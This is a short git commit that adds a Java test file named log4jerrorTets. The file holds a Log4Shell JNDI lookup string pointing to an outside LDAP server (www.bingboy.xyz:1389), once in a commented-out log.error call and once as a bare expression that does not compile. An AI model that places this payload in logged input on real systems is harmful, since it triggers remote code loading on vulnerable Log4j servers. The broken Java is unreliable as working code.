acf037017eaf63113f226c318207a36335802487
hbdym <hbdym@live.com>
2021-12-23 20:22:18 +0800

    修改 log_list

---
+++ src/test/java/com/example/log4jerrorTets.java
@@ -0,0 +1,13 @@
+package com.example;
+import org.apache.logging.log4j.*;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class log4jerrorTets {
+    public static void main(String[] args) throws NamingException {
+        //log.error("${ldap://www.bingboy.xyz:1389/haiaaw}");
+        ("${ldap://www.bingboy.xyz:1389/haiaaw}");
+    }
+
+}
